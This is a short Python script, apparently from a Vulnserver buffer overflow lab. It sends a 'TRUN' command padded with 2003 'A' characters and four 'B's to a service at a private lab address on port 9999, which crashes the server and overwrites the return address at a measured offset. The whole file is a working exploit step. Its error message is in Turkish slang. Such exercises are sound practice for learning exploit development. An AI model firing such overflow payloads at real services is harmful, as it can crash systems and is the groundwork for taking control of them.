import socket
import sys

stringToSend = "TRUN /.:/" + "A" * 2003 + "B" * 4
try:
    mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mySocket.connect(("10.0.2.15",9999))
    bytes = stringToSend.encode(encoding="latin1")
    mySocket.send(bytes)
    mySocket.close()
except KeyboardInterrupt:
    sys.exit()
except Exception as e:
    print("Sunucu aşko babay<3\n"+e)
    sys.exit()

